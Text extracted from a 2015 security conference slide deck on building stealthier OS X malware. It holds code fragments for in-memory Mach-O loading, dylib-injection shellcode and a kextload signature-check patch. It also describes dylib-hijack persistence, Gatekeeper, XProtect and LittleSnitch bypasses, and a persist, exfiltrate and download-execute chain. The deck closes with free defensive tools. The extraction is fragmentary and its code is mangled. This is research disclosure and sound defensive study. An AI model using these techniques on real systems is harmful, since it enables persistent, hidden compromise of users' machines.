{
    "id": "87390874-14bc-4291-bdbc-70947ffa6f84",
    "created_at": "2022-10-25T16:48:14.008973Z",
    "updated_at": "2025-03-27T02:09:29.945638Z",
    "deleted_at": null,
    "sha1_hash": "f3fee13a932e4445d40980ebf30a9a6e7cceb613",
    "title": "blackhat.key",
    "authors": "",
    "file_creation_date": "2015-07-21T06:15:16Z",
    "file_modification_date": "2015-07-21T06:15:16Z",
    "file_size": 49567267,
    "plain_text": "###### Writing Bad @$$ Malware\n for OS X\n\n\n-----\n\n###### WHOIS\n always looking for more experts!\n\n “sources a global contingent of vetted security experts worldwide and pays them on an incentivized basis to discover security vulnerabilities in our customers’ web apps, mobile apps, and infrastructure endpoints.”\n\n @patrickwardle\n\n\n-----\n\n###### AN OUTLINE this talk will cover…\n\n bad @$$ malware\n\n overview of os x defenses\n malware\n\n infection persistence self-defense features bypassing psps\n\n\n-----\n\n###### OVERVIEW OF OS X MALWARE\n the current status quo\n\n\n-----\n\n###### THE RISE OF MACS macs are everywhere (home & enterprise)\n\n doesn’t \r include \r iDevices\n\n 14\n\n 10.5\n\n 7\n #3 usa / #5 worldwide  vendor in pc shipments 3.5\n\n 0\n '09 '10 '11 '12 '13\n year\n macs as % of total usa pc sales\n\n \"Mac notebook sales have grown 21% over the last year,  while total industry sales have fallen\" -apple (3/2015)\n\n\n-----\n\n###### MALWARE ON OS X? but macs don’t get malware…right?\n\n “It doesn’t get PC viruses. A Mac isn’t susceptible to the thousands of viruses plaguing Windows-based computers.” -apple.com (2012)\n\n ‘first’ virus (elk cloner)\n last 5 years; ~50 new infected apple II’s os x malware families\n \"[2014] nearly 1000 unique\n attacks on Macs; 25 major\n families\" -kasperksy\n\n\n-----\n\n###### OSX/XSLCMD provides reverse shell, keylogging, & screen capture\n\n __cstring:0000E910 db \r 'clipboardd',0 db \r 'com.apple.service.clipboardd.plist',0 \r  db \r '/Library/LaunchAgents',0 \r  \r \n OS X 10.9+ crashes\n db \r '<plist \r version=\"1.0\">',0Ah \r  \r  \r  \r '<key>RunAtLoad</key>',0Ah \r \n\n “a previously unknown variant of the APT backdoor XSLCmd which is designed to compromise Apple OS X systems” -fireeye.com\n\n launch agent reverse shell keylogging screen capture\n\n\n-----\n\n###### # \r fs_usage \r -­‐w \r -­‐f \r filesys \r  20:28:28.727871 \r  \r open \r  \r  \r /Library/LaunchDaemons/com.JavaW.plist \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  20:28:28.727890 \r  \r write \r  \r  \r  \r B=0x16b \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r \n\n\n###### OSX/IWORM ‘standard’ backdoor, providing survey, download/execute, etc.\n\n infected torrents launch daemon plist\n\n # \r fs_usage \r -­‐w \r -­‐f \r filesys \r  20:28:28.727871 \r  \r open \r  \r  \r /Library/LaunchDaemons/com.JavaW.plist \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  20:28:28.727890 \r  \r write \r  \r  \r  \r B=0x16b \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r \n\n persisting\n\n\n-----\n\n###### OSX/WIRELURKER an iOS infector (via USB)\n\n “a collection of scripts, plists, & binaries all duct-taped\n together... making it easy to detect.” -j zdziarski\n\n infects connected iPhones\n\n texts\n\n infected app(s) 'Maiyadi App Store'\n\n contacts\n\n survey\n\n\n-----\n\n###### OSX/CRISIS (RCSMAC) hackingteam's implant; collect all things!\n\n persistence\n\n features\n “There is nothing to be impressed from them from a technical point of view.” -@osxreverser\n\n\n-----\n\n###### THE (KNOWN) STATUS QUO the current state of OS X malware\n\n ‣ 'hide' in plain site\n ‣ trojans\n ‣ stand-alone executables\n ‣ phishing/old bugs\n stealth\n infection\n ‣ occasionally exploits\n\n ‣ inelegantly implemented\n ‣ well known techniques \n ‣ suffice for the job\n ‣ majority: launch items\n features\n persistence\n\n ‣ no psp detection/logic\n ‣ minimal obfuscation\n ‣ trivial to detect\n ‣ trivial to detect & remove\n self-defense psps bypass\n\n “current OS X malware, while sufficient, is inelegant, amateur, and trivial to detect & prevent” grade: C+\n\n\n-----\n\n###### BAD @$$ OS X MALWARE\n current malware++\n\n\n-----\n\n###### INITIAL INFECTION VECTOR(S) current methods are rather lame\n\n protects dumb users\n\n fake installers/updates\n\n fake codecs\n Gatekeeper blocking untrusted code\n\n somewhat effective, but smart users should be ok.\n\n\n-----\n\n###### INFECTING SOFTWARE DOWNLOADS a far better infection channel MitM & infect non-SSL'd\n internet downloads\n\n still need to bypass GateKeeper... ;)\n\n HTTP :(\n\n my dock\n\n\n-----\n\n###### INFECTING AV SOFTWARE DOWNLOADS these should be secure, right!?\n all the security software I could find, was downloaded over HTTP!\n\n LittleSnitch\n\n ClamXav\n\n Sophos\n\n\n-----\n\n###### PERSISTANCE current methods are very lame\n\n MacProtector's login item\n persistence methods\n\n $ \r python \r knockknock.py \r \n\n com.apple.MailServiceAgentHelper \r  path: \r /usr/bin/com.apple.MailServiceAgentHelper \r \n\n com.apple.appstore.PluginHelper \r  path: \r /usr/bin/com.apple.appstore.PluginHelper \r \n launch items login items\n periodicdate \r  path: \r /usr/bin/periodicdate\n systemkeychain-­‐helper \r \n ‣ well known path: \r /usr/bin/systemkeychain-­‐helper ‣ easily visible\n\n\n-----\n\n###### BINARY INFECTION? fairly stealthy & difficult to disinfect\n\n OS loader verifies all\n signatures :(\n\n killed by the loader\n\n Process: \r  \r  \r  \r  \r  \r  \r  \r  \r Safari \r [1599] \r  Path: \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r Safari.app/Contents/MacOS/Safari \r \n\n Exception \r Type: \r  \r EXC_CRASH \r (Code \r Signature \r Invalid) \r  Exception \r Codes: \r 0x0000000000000000, \r 0x0000000000000000\n\n\n-----\n\n###### BINARY INFECTION? the crypto seems solid, but what if it was gone?\n code signature\n\n # \r md5 \r Safari.app/Contents/MacOS/Safari \r -­‐> \r  \r  \r  \r  \r  \r  \r  \r 633d043cf9742d6f0787acdee742c10d\n\n # \r unsign.py \r Safari.app/Contents/MacOS/Safari \r  \r Safari \r code \r signature \r removed\n # \r md5 \r Safari.app/Contents/MacOS/Safari \r -­‐> \r  \r  \r  \r  \r  \r  \r 825edd6a1e3aefa98d7cf99a60bac409\n $ \r open \r /Applications/Safari.app \r && \r ps \r aux \r | \r grep \r Safari \r \n :)\n \r  \r patrick \r  \r 31337 \r  \r /Applications/Safari.app \r \n\n\n-----\n\n###### PERSISTENCE VIA BINARY INFECTION\n google 'OS.X/Boubou'\n (now), lots of options!\n\n hijack entry point?\n\n add new ?\n```\n                    LC_LOAD_DYLIB\n\n self-contained\n\n difficult to disinfect!\n somewhat difficult to detect\n\n```\n\n-----\n\n###### DYLIB HIJACKING white paper\n```\n                       www.virusbtn.com/dylib an overview\n                      app dir\n\n \"I need \"\n      <blah>.dylib\n                  <blah>.dylib <blah>.dylib\n\n that references a non-existent dylib\n    LC_LOAD_WEAK_DYLIB\n\n with 'd import & multiple  with the\n    LC_LOAD*_DYLIB @rpath LC_RPATHs run-path dependent library not found in a primary run-path search path\n\n```\n\n-----\n\n###### DYLIB HIJACKING PERSISTENCE via Apple's PhotoStreamAgent ('iCloudPhotos.app')\n\n configure hijacker against (dylib)\n```\n                       PhotoFoundation\n\n copy to\n              /Applications/iPhoto.app/Contents/\n          Library/LoginItems/PhotoFoundation.framework/\n\n PhotoStreamAgent Versions/A/PhotoFoundation\n\n $ \r reboot \r  \r  $ \r lsof \r -­‐p \r <pid \r of \r PhotoStreamAgent> \r  /Applications/iPhoto.app/Contents/Library/LoginItems/PhotoFoundation.framework/Versions/A/PhotoFoundation \r  /Applications/iPhoto.app/Contents/Frameworks/PhotoFoundation.framework/Versions/A/PhotoFoundation\n\n novel\n abuses legitimate \n no new processes\n functionality of OS X\n no binary/OS modifications\n\n```\n\n-----\n\n###### PLUGIN PERSISTENCE abusing system plugins for persistence\n for all files:\n```\n                                        public.data\n\n plugin match type spotlight importer template\n\n $ \r reboot \r  \r  $ \r lsof \r -­‐p \r <pid \r of \r mdworker> \r  /System/Library/Frameworks/CoreServices.framework/../Metadata.framework/Versions/A/Support/mdworker \r  /Library/Spotlight/persist.mdimporter/Contents/MacOS/persist\n\n no new procs\n abuses legitimate \n data 'sniffer'\n functionality of OS X\n 'on-demand'\n\n```\n\n-----\n\n###### SELF-DEFENSE currently, essentially non-existent too easy for the\n AV companies!\n\n trivial to find\n\n self-defense methods\n\n trivial to analyze\n\n trivial to disinfect\n\n some crypto 'hide' in plain sight\n\n\n-----\n\n###### ENCRYPTED MACH-O BINARIES abusing OS X's natively supported encryption\n $ \r strings \r -­‐a \r myMalware \r  \r  applicationDidFinishLaunching: \r \n //load \r & \r decrypt \r segments \r  @\"NSString\"16@0:8 \r  load_segment(...){ \r \n I \r <3 \r BLACKHATE! \r \n //decrypt \r encrypted \r segments \r  \r if(scp-­‐>flags \r & \r SG_PROTECTED_VERSION_1) \r \n $ \r ./protect \r myMalware \r \n \r unprotect_dsmos_segment(scp-­‐>fileoff, \r scp-­‐>filesize, \r vp, \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r pager_offset, \r map, \r map_addr, \r map_size); \r \n \r encrypting \r 'myMalware' \r \n }\n type: \r CPU_TYPE_X86_64 \r \n //decrypt \r chunk unprotect_dsmos_segment(...){\n \r encryption \r complete \r \n //function \r pointer \r to \r decryption \r routine \r  \r crypt_info.page_decrypt \r = \r dsmos_page_transform;\n $ \r strings \r -­‐a \r myMalware \r  n^jd[P5{Q \r \n \r  \r //decrypt \r  \r vm_map_apple_protected(map, \r map_addr, \r map_addr \r + \r map_size, \r  r_`EYFaJq07 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r &crypt_info);\n\n }\n\n algo: Blowfish ourhardworkbythesewordsguar\n known malware: \n```\n          dedpleasedontsteal(c)AppleC\n\n```\n\n-----\n\n```\nN: environmental observation\nH: a one way (hash) function \nM: hash(es) H of observation N,\n  needed for activation,     \n  carried by agent\nK: a key\n\n```\n\n###### STRONGLY ENCRYPT YOUR MALWARE tie to a specific target\n \"environmental key generation towards clueless agents\"\n```\n                  N: environmental observation\n                  H: a one way (hash) function \n                  M: hash(es) H of observation N,\n                   needed for activation,     \n                   carried by agent\n                  K: a key\n                  //at runtime\n                  if H(H(N)) = M then let K := H(N)\n\n intended target any other\n 'equation malware'\n\n \"[the malware] tied the infection to the specific machine, and meant the payload couldn't be decrypted without knowing the NTFS object ID\"\n\n```\n\n-----\n\n###### IN-MEMORY DECRYPTION & LOADING\n custom crypto, requires custom loader\n\n custom in-memory\n C&C server\n loader?\n\n memory\n\n load\n mapping link\n dependencies\n image\n\n OS X supports  in-memory loading!\n\n\n-----\n\n###### IN-MEMORY MACH-O LOADING supports in-memory loading/linking\n```\n dyld\n no longer hosted\n\n //vars \r  NSObjectFileImage \r fileImage \r = \r NULL; \r  NSModule \r module \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r = \r NULL; \r  sample code NSSymbol \r symbol \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r = \r NULL; \r  released by apple void \r (*function)(const char \r *message); \r  \r \n (2005)\n //have \r an \r in-­‐memory \r (file) \r image \r of \r a \r mach-­‐O \r file \r to \r load/link \r  // \r -­‐>note: \r memory \r must \r be \r page-­‐aligned \r and \r alloc'd \r via \r vm_alloc!\n\n //create \r object \r file \r image NSCreateObjectFileImageFromMemory(codeAddr, \r codeSize, \r &fileImage);\n\n //link \r module module \r = \r NSLinkModule(fileImage, \r \"<anything>\", \r NSLINKMODULE_OPTION_PRIVATE); \r \n 'MemoryBasedBundle'\n //lookup \r exported \r symbol \r (function) \r  symbol \r = \r NSLookupSymbolInModule(module, \r \"_\" \r \"HelloBlackHat\");\n\n //get \r exported \r function's \r address function \r = \r NSAddressOfSymbol(symbol);\n\n //invoke \r exported \r function function(\"thanks \r for \r being \r so \r offensive \r ;)\");\n stealth++\n\n loading a mach-O file from memory\n\n```\n\n-----\n\n###### SELF DEFENSE\n # \r /usr/bin/opensnoop \r \n other random ideas\n 0 \r  \r 90189 \r AVSCANNER \r  \r  \r malware.dylib\n\n detect local access (dtrace)\n\n self-monitoring?\n\n prevent deletion?\n virusTotal\n\n \"The  flag can only be\n```\n       schg\n detect detections\n unset in single-user mode\"\n\n 40\n\n 30\n # \r chflags \r schg \r malware.dylib\n\n 20\n # \r rm \r malware.dylib \r  rm: \r malware.dylib: \r Operation \r not \r permitted\n 10\n\n 0\n jan feb mar apr may\n 'complicating' deletion\n\n```\n\n-----\n\n###### RUN-TIME PROCESS INJECTION getting code into remote processes\n the goal\n\n at run-time, inject arbitrary dynamic libraries (dylibs) into arbitrary process\n\n no x86_64 :(\n mach_inject (PPC & i386)\n mac hacker's\n handbook\n buggy/broken :(\n run-time injection\n (intentionally)\n x86_64\n\n\n-----\n\n###### RUN-TIME PROCESS INJECTION determining target process' architecture\n\n //check \r if \r remote \r process \r is \r x86_64 \r  BOOL \r Is64Bit(pid_t \r targetPID) \r  { \r  //info \r struct \r  \r  \r  \r struct \r proc_bsdshortinfo \r procInfo; \r \n //get \r proc \r info \r  \r  \r  \r  \r // \r -­‐>assumes \r valid \r pid, \r etc \r  \r  \r  \r  \r proc_pidinfo(targetPID, \r PROC_PIDT_SHORTBSDINFO, \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r 0, \r &procInfo, \r PROC_PIDT_SHORTBSDINFO_SIZE); \r  64\n //'pbsi_flags' \r has \r a \r 64-­‐bit \r mask \r  \r  \r  \r  \r return \r procInfo.pbsi_flags \r & \r PROC_FLAG_LP64; \r \n all 64-bit\n }\n\n external process, architecture detection\n```\n      32\n\n 3rd-party\n\n```\n\n-----\n\n###### RUN-TIME PROCESS INJECTION target's process architecture\n```\n                                www.newosxbook.com\n\n //remote \r library \r loading \r shellcode \r (x86_64) \r  \r  char \r shellCode[] \r = \r \n                                             64\n\n \r \"\\x90\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r nop.. \r \"\\x55\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r pushq \r  \r %rbp \r \"\\x48\\x89\\xe5\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movq \r  \r  \r %rsp, \r %rbp \r \"\\x48\\x83\\xec\\x20\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r subq \r  \r  \r $32, \r %rsp \r \"\\x89\\x7d\\xfc\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movl \r  \r  \r %edi, \r -­‐4(%rbp) \r \"\\x48\\x89\\x75\\xf0\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movq \r  \r  \r %rsi, \r -­‐16(%rbp) \r \"\\xb0\\x00\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movb \r  \r  \r $0, \r %al\n // \r call \r pthread_set_self \r  \r \"\\x48\\xbf\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \r  \r  \r  \r // \r movabsq \r $0, \r %rdi \r \"\\x48\\xb8\" \r \"_PTHRDSS\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movabsq \r $140735540045793, \r %rax \r \"\\xff\\xd0\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r callq \r  \r *%rax \r \"\\x48\\xbe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \r  \r  \r  \r // \r movabsq \r $0, \r %rsi \r \"\\x48\\x8d\\x3d\\x2c\\x00\\x00\\x00\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r leaq \r  \r  \r 44(%rip), \r %rdi // \r dlopen \r  addrs patched  \r \"\\x48\\xb8\" \r \"DLOPEN__\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r \"\\x48\\xbe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \r  \r  \r  \r // \r movabsq \r $140735516395848, \r %rax// \r movabsq \r $0, \r %rsi in at runtime  \r \"\\xff\\xd0\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r callq \r  \r *%rax\n // \r sleep(1000000)... \r  \r \"\\x48\\xbf\\x00\\xe4\\x0b\\x54\\x02\\x00\\x00\\x00\" \r  \r  \r  \r // \r movabsq \r $10000000000, \r %rdi \r \"\\x48\\xb8\" \r \"SLEEP___\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r movabsq \r $140735516630165, \r %rax \r \"\\xff\\xd0\" \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r // \r callq \r  \r *%rax\n }\n // \r plenty \r of \r space \r for \r a \r full \r path \r name \r here \r  \r \"LIBLIBLIBLIB\" \r \"\\x00\\x00\\x00\\x00\\x00\\x00....\";\n\n```\n\n-----\n\n###### RUN-TIME PROCESS INJECTION getting code into remote processes\n or anything!\n```\n                           pthread_set_self()\n   task_for_pid()\n               vm_protect()\n                           dlopen()\n\n injected shellcode\n mach_vm_allocate()\n            thread_create_running()\n\n```\n\n-----\n\n###### LOAD-TIME PROCESS INJECTION dylib injection (again) ftw!\n\n gain automatic & persistent code execution within a process only via a dynamic library hijack\n\n no binary / OS file modifications no process monitoring\n\n < >\n```\n    010 no complex runtime injection no detection of injection\n\n```\n\n-----\n\n###### LOAD-TIME PROCESS INJECTION into Apple's Xcode\n\n $ \r python \r dylibHijackScanner.py \r  \r \n Xcode \r is \r vulnerable \r (multiple \r rpaths) \r \n 'binary': \r  \r  \r  \r  \r  \r  \r  \r '/Applications/Xcode.app/Contents/MacOS/Xcode' \r  'importedDylib': \r '/DVTFoundation.framework/Versions/A/DVTFoundation' \r  \r  'LC_RPATH': \r  \r  \r  \r  \r  \r '/Applications/Xcode.app/Contents/Frameworks'\n\n configure hijacker against  (dylib)\n```\n                       DVTFoundation\n\n copy to\n              /Applications/Xcode.app/Contents/\n          Frameworks/DVTFoundation.framework/Versions/A/\n\n Xcode\n do you trust your compiler now!? (k thompson)\n\n```\n\n-----\n\n###### BYPASSING SECURITY PRODUCTS/TECHNOLOGIES ...starting with Apple's\n\n so we’re all safe now,\n right?!?\n\n gatekeeper xprotect\n nope! < }\n ‘wins’\n\n os x sandbox code-signing\n\n\n-----\n\n###### BYPASSING GATEKEEPER allowing unsigned code to execute\n the goal\n\n circumvent gatekeeper's draconic blockage via a dynamic library hijack\n\n bypass this?\n\n\n-----\n\n###### HOW GATEKEEPER WORKS all files with quarantine attribute are checked\n safari, etc. tags downloaded content\n\n //attributes \r  $ \r xattr \r -­‐l \r ~/Downloads/malware.dmg \r  \r  \r  \r com.apple.quarantine:0001;534e3038; \r  \r  \r Safari; \r B8E3DA59-­‐32F6-­‐4580-­‐8AB3... \r \n\n quarantine attributes\n\n \"Gatekeeper is an anti-malware feature of the OS X operating system. It allows users to restrict which sources they can install applications from, in order to reduce the likelihood of executing a\n\n\n-----\n\n###### GATEKEEPER BYPASS\n verified, so can't\n go home gatekeeper, you are drunk!\n not verified!\n modify\n```\n                    <external>.dylib\n\n (signed)    application gatekeeper only verifies\n the app bundle!!\n .dmg/.zip layout\n\n find an   -signed or 'mac app store' app that contains an external relative reference to a hijackable dylib\n\n create a .dmg with the necessary folder structure to contain the malicious dylib in the externally referenced location\n\n #winning\n\n```\n\n-----\n\n###### GATEKEEPER BYPASS 1) a signed app that contains an external reference to hijackable dylib\n```\n            spctl\n\n tells you if gatekeeper will accept the app\n\n $ \r spctl \r -­‐vat \r execute \r /Applications/Xcode.app/Contents/Applications/Instruments.app \r  Instruments.app: \r accepted \r  source=Apple \r System\n\n $ \r otool \r -­‐l \r Instruments.app/Contents/MacOS/Instruments \r \n\n Load \r command \r 16 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r cmd \r LC_LOAD_WEAK_DYLIB \r  \r  \r  \r  \r  \r  \r  \r  \r  \r name \r @rpath/CoreSimulator.framework/Versions/A/CoreSimulator \r \n Load \r command \r 30 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r cmd \r LC_RPATH \r  \r  \r  \r  \r  \r  \r  \r  \r  \r path \r @executable_path/../../../../SharedFrameworks\n\n```\n\n-----\n\n###### GATEKEEPER BYPASS 2) create a .dmg with the necessary layout\n\n required directory structure\n\n 'clean up' the .dmg\n ‣ hide files/folder\n (deployable) malicious .dmg\n ‣ set top-level alias to app ‣ change icon & background ‣ make read-only\n\n\n-----\n\n###### GATEKEEPER BYPASS\n still can bypass ;)\n 3) #winning\n```\n                             CVE 2015-3715\n\n patched in OS X 10.10.4\n\n gatekeeper setting's\n (maximum)\n\n unsigned (non-Mac App Store)\n standard alert\n code execution!!\n\n```\n\n-----\n\n###### BYPASSING XPROTECT avoiding detection\n the goal\n\n circumvent XProtect's malware detection so that malware can run in an uninhibited manner\n\n bypass this?\n\n\n-----\n\n###### BYPASSING XPROTECT apple's built-in AV product is weak sauce\n\n name\n bypasses\n\n hash\n\n file name recompile write new\n\n XProtect signature file (iWorm)\n ...or just rename!\n\n\n-----\n\n###### ESCAPING THE OS X SANDBOX decently secure, but lots of OS X bugs! the goal\n\n escape from the OS X sandbox to so that our malicious code can perform malicious actions.\n\n app sandboxed app\n\n [ bypasses ]\n\n 20+ bugs that could bypass the sandbox (‘project zero’)\n\n \"Unauthorized Cross-App Resource Access on  Mac OS X & iOS\"\n\n\n-----\n\n###### BYPASSING KERNEL-MODE CODE SIGNING allowing unsigned kext to load\n the goal\n\n load malicious unsigned kexts into the kernel\n\n bypass this?\n\n\n-----\n\n###### BYPASSING KERNEL-MODE CODE SIGNING directly interface with the kernel\n\n loadKextsIntoKernel(KextloadArgs \r * \r toolArgs) { //sigResult \r = \r checkKextSignature(theKext, \r 0x1, \r earlyBoot);\n\n \r  \r //always \r OK! \r  \r  \r sigResult \r = \r 0; \r \n download patch & recompile\n }\n```\n kext_tools kextload\n patched\n                            kextload\n\n //unload \r kext \r daemon \r  # \r launchctl \r unload \r /System/Library/LaunchDaemons/com.apple.kextd.plist \r \n\n //load \r (unsigned) \r driver \r with \r custom \r kext_load \r  # \r ./patchedKextload \r -­‐v \r unsigned.kext \r  \r Can't \r contact \r kextd; \r attempting \r to \r load \r directly \r into \r kernel \r \n\n //profit \r :) \r  # \r kextstat \r | \r grep \r -­‐i \r unsigned \r  \r  \r 138 \r  \r  \r  \r 0 \r 0xffffff7f82eeb000 \r  \r com.synack.unsigned\n\n```\n\n-----\n\n###### NEED ROOT? CVE-2015-3673\n finally patched; OS X 10.10.4\n rootpipe reborn!\n copy to  to\n```\n      Directory Utility /tmp get write permissions\n\n $ \r ls \r -­‐lart \r /private/tmp \r  drwxr-­‐xr-­‐x \r  \r patrick \r  \r wheel \r  \r  \r Directory \r Utility.app\n evil plugin\n\n copy plugin (.daplugin) into\n                Directory 's internal plugin directory\n   Utility\n\n XPC request\n                      Dir. Utility\n execute \n        Directory Utility\n\n authenticates\n\n```\n\n-----\n\n###### BYPASSING SECURITY PRODUCTS ...and the rest (equally lame)\n\n bypasses\n\n LittleSnitch\n\n recompile write new\n ClamXav\n\n Sophos\n behavioral based  (firewall)\n\n\n-----\n\n###### BYPASSING LITTLESNITCH abusing trust to access the network\n the goal\n\n generically bypass LittleSnitch to allow malicious code to access the network in an uninhibited manner?\n\n bypass this?\n\n\n-----\n\n###### LITTLE SNITCH BYPASS 0X1 load-time 'injection' into a trusted process\n\n $ \r python \r dylibHijackScanner.py \r  \r \n GPG \r Keychain \r is \r vulnerable \r (weak/rpath'd \r dylib) \r \n 'binary': \r  \r  \r  \r  \r  \r  \r  \r '/Applications/GPG \r Keychain.app/Contents/MacOS/GPG \r Keychain' \r  'weak \r dylib': \r  \r  \r  \r '/Libmacgpg.framework/Versions/B/Libmacgpg' \r  \r  'LC_RPATH': \r  \r  \r  \r  \r  \r '/Applications/GPG \r Keychain.app/Contents/Frameworks'\n\n LittleSnitch rule for GPG Keychain\n\n GPG Keychain\n\n\n-----\n\n###### LITTLE SNITCH BYPASS 0X2\n un-deletable system rule:\n more generically, via iCloud\n \"anybody can talk to iCloud\"\n\n LittleSnitch's iCloud rule\n\n iCloud\n\n o rly!?...yes!\n\n\n-----\n\n###### SIMPLE END-TO-END ATTACK\n doesn't require r00t!\n putting some pieces all together\n```\n     persist\n       persistently install a malicious\n       dylib as a hijacker\n     exfil file\n       upload a file ('topSecret') to a\n       remote iCloud account\n     download & execute cmd\n       download and run a command\n       ('Calculator.app')\n\n```\n\n-----\n\n###### PSP TESTING the AV industry vs me ;)\n are these blocked?\n```\n                persist\n                exfil file\n                download & execute cmd\n\n ClamXav\n\n Sophos\n\n LittleSnitch\n\n```\n\n-----\n\n```\n       DEFENSE\n     free os x security tools\n\n```\n\n-----\n\n###### MY CONUNDRUM\n …I love my mac, but it's so easy to hack :/\n\n I should write some OS X security tools to protect my Mac\n +\n            ....and share 'em freely :)\n\n ha, BULLSHIT!\n\n \"No one is going to provide you a quality service for nothing. If you’re not paying, you’re the product.\" -unnamed AV company\n\n\n-----\n\n###### OBJECTIVE-SEE free OS X tools & malware samples\n malware samples :)\n\n\n-----\n\n###### KNOCKKNOCK UI\n detecting persistence: now an app for that!\n\n KnockKnock (UI)\n\n\n-----\n\n###### KNOCKKNOCK UI\n VirusTotal integration\n\n detect submit rescan results\n\n VirusTotal integrations\n\n\n-----\n\n###### BLOCKBLOCK\n status bar\n continual runtime protection\n\n HackingTeam's OS X implant\n\n BlockBlock, block blocking :)\n\n\n-----\n\n###### TASKEXPLORER\n explore all running tasks (processes) filters\n\n signing\n\n virus total\n\n dylibs\n\n files\n\n network\n\n\n-----\n\n###### EL CAPITAN (OS X 10.11)\n next version of OS X to keep us all safe?\n \"rootless\"\n\n System \r Integrity \r Protection \"A \r new \r security \r policy \r that \r applies \r to \r every \r running \r process, \r including \r  privileged \r code \r and \r code \r that \r runs \r out \r of \r the \r sandbox. \r The \r policy \r extends \r  additional \r protections \r to \r components \r on \r disk \r and \r at \r run-­‐time, \r only \r  allowing \r system \r binaries \r to \r be \r modified \r by \r the \r system \r installer \r and \r  software \r updates. \r Code \r injection \r and \r runtime \r attachments \r to \r system \r  binaries \r are \r no \r longer \r permitted.\" \r -­‐apple.com\n\n the test:\n iWorm vs. OS X 10.11 (beta 3) \"wut!?\"\n\n\n-----\n\n###### CONCLUSIONS\n …wrapping this up\n\n current OS X malware & PSP product are lame!\n\n improve the malwarez\n\n infection persistence self-defense features bypassing psps\n\n think differently\n\n\n-----\n\n###### QUESTIONS & ANSWERS\n feel free to contact me any time!\n\n patrick@synack.com\n\n @patrickwardle\n\n final thought ;)\n\n \"What if every country has ninjas, but we only know about the Japanese ones because they’re rubbish?\" -DJ-2000, reddit.com\n\n\n-----\n\n###### credits\n\n - thezooom.com - deviantart.com (FreshFarhan) - http://th07.deviantart.net/fs70/PRE/f/2010/206/4/4/441488bcc359b59be409ca02f863e843.jpg\n\n - iconmonstr.com - images flaticon.com\n\n - @osxreverser - http://reverse.put.as/Hitcon_2012_Presentation.pdf - https://www.syscan.org/index.php/download/get/9ee8ed70ddcb2d53169b2420f2fa286e/ SyScan15%20Pedro%20Vilaca%20-%20BadXNU%20a%20rotten%20apple - 